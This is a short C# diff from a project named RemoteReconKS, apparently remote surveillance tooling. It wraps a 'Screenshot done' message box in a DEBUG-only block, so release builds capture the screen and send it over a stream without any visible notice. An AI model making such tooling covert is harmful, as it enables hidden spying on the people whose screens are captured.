@@ -36,7 +36,9 @@ namespace RemoteReconKS
                     sw.WriteLine(screenshot());
                     Thread.Sleep(5000);
                     sw.Flush();
+#if DEBUG
                     MessageBox.Show("Screenshot done");
+#endif
                     server.Close();
                 }
                 catch (Exception e)
